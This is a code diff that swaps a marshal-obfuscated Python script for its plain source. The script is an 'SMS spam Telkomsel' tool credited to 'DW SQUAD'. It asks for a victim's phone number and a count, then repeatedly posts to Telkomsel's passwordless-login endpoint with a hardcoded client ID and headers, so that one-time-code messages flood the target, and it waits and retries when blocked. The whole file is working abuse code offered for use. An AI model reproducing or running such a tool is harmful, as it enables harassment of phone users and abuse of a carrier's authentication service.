@@ -1,6 +1,39 @@
-#Coder By: Rusmana-ID
-#Team: Black Coder Cerush
-#Github: https://github.com/Rusmana-ID
-#Channel Youtube: Tutorial Android-ID
-import marshal
-exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00@\x00\x00\x00sL\x01\x00\x00y\xfad\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03e\x01\xa0\x04d\x02\xa1\x01\x01\x00e\x05d\x03\x83\x01\x01\x00e\x06d\x04\x83\x01Z\x07e\x08e\x06d\x05\x83\x01\x83\x01Z\te\x05\x83\x00\x01\x00d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0f\x9c\tZ\nd\x10d\x11e\x07\x17\x00d\x12d\x13\x9c\x03Z\x0be\x08d\x00\x83\x01Z\x0cxxe\x0ce\tk\x00r\xf6e\x0cd\x147\x00Z\x0ce\x00j\rd\x15e\x0be\nd\x16\x8d\x03Z\x0ee\x0ej\x0fd\x17k\x02r\xcee\x05d\x18e\x10e\x0c\x83\x01\x17\x00d\x19\x17\x00e\x07\x17\x00\x83\x01\x01\x00e\x02\xa0\x11d\x1a\xa1\x01\x01\x00q\x80e\x05d\x1be\x07\x17\x00\x83\x01\x01\x00e\x05d\x1c\x83\x01\x01\x00e\x0cd\x148\x00Z\x0ce\x02\xa0\x11d\x1d\xa1\x01\x01\x00q\x80W\x00W\x00nL\x04\x00e\x12k\n\x90\x01r\x18\x01\x00\x01\x00\x01\x00e\x13d\x1e\x83\x01\x01\x00Y\x00n0\x04\x00e\x14k\n\x90\x01rF\x01\x00Z\x15\x01\x00z\x10e\x05d\x1fe\x15\x16\x00\x83\x01\x01\x00W\x00d\x01d\x01Z\x15[\x15X\x00Y\x00n\x02X\x00d\x01S\x00) \xe9\x00\x00\x00\x00N\xda\x05clearzG\n\t[ SPAM SMS TELKOMSEL V1 ]\n\t   [ DW SQUAD OFFICAL ]\n\n[ex] 628XXXXXXXXXz\x0f[?] No target: z\x0c[?] Jumlah: Z2eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiNy42LjEifQz\x18https://my.telkomsel.comz\x11gzip, deflate, brz\x0een-US,en;q=0.9zhMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36z!application/x-www-form-urlencodedz"application/json, text/javascriptez\x19https://my.telkomsel.com/z\nkeep-alive)\tz\x0cAuth0-ClientZ\x06Originz\x0fAccept-Encodingz\x0fAccept-Languagez\nUser-Agentz\x0cContent-TypeZ\x06AcceptZ\x07RefererZ\nConnectionZ Xlj9pkfK6yYumf6G8KE2S5TDWgTtczb0\xfa\x01+Z\x03sms)\x03Z\tclient_idZ\x0cphone_numberZ\nconnection\xe9\x01\x00\x00\x00z/https://tdwidm.telkomsel.com/passwordless/start)\x02\xda\x04dataZ\x07headers\xe9\xc8\x00\x00\x00\xfa\x01[z\x1b] sukses mengirim pesan ke g\x00\x00\x00\x00\x00\x00\xe0?z\x1c[-] gagal mengirim pesan ke z\r[!] sleep 60s\xe9<\x00\x00\x00z\x14[Exit] key interruptz\x08[Err] %s)\x16Z\x08requests\xda\x02os\xda\x04time\xda\x03sys\xda\x06system\xda\x05print\xda\x05inputZ\x02no\xda\x03intZ\x03jmlZ\x06headerZ\x03dat\xda\x01cZ\x04postZ\x03atcZ\x0bstatus_code\xda\x03str\xda\x05sleep\xda\x11KeyboardInterrupt\xda\x04exit\xda\tException\xda\x01F\xa9\x00r\x17\x00\x00\x00r\x17\x00\x00\x00\xda\x00\xda\x08<module>\x03\x00\x00\x00s@\x00\x00\x00\x02\x01 \x01\n\x01\x02\x04\x06\x01\x08\x01\x0c\x01\x06\x01\x02\x01\x02\x01\x02\x01\x02\x01\x02\x01\x02\x01\x02\x01\x02\x01\x08\x01\x10\x01\x08\x01\n\x01\x08\x01\x10\x02\n\x01\x18\x01\x0c\x02\x0c\x01\x08\x01\x08\x01\x12\x02\x10\x00\x0c\x01\x12\x01'))
+#!usr/bin/python3.7
+try:
+	import requests,os,time,sys
+	os.system('clear')
+	print("""
+\t[ SPAM TELKOMSEL V2 ]
+\t   [ By:DW SQUAD ]
+
+[ex] 628XXXXXXXXX""")
+	no=input("[?] No target: ")
+	jml=int(input("[?] Jumlah: "))
+	print()
+	header = {'Auth0-Client':'eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiNy42LjEifQ',
+	'Origin':'https://my.telkomsel.com',
+	'Accept-Encoding':'gzip, deflate, br',
+	'Accept-Language':'en-US,en;q=0.9',
+	'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
+	'Content-Type':'application/x-www-form-urlencoded',
+	'Accept':'application/json, text/javascripte',
+	'Referer':'https://my.telkomsel.com/',
+	'Connection':'keep-alive'}
+	dat={'client_id':'Xlj9pkfK6yYumf6G8KE2S5TDWgTtczb0','phone_number':'+'+no,'connection':'sms'}
+	c=int(0)
+	while c < jml:
+		c+=1
+		atc=requests.post("https://tdwidm.telkomsel.com/passwordless/start",data=dat,headers=header)
+#		print(atc.text)
+		if atc.status_code == 200:
+			print("["+str(c)+"] sukses mengirim pesan ke "+no)
+			time.sleep(0.5)
+		else:
+			print("[-] gagal mengirim pesan ke "+no)
+			print("[!] sleep 60s")
+			c-=1
+			time.sleep(60)
+
+except KeyboardInterrupt: exit("[Exit] key interrupt")
+except Exception as F:
+	print("[Err] %s"%(F))
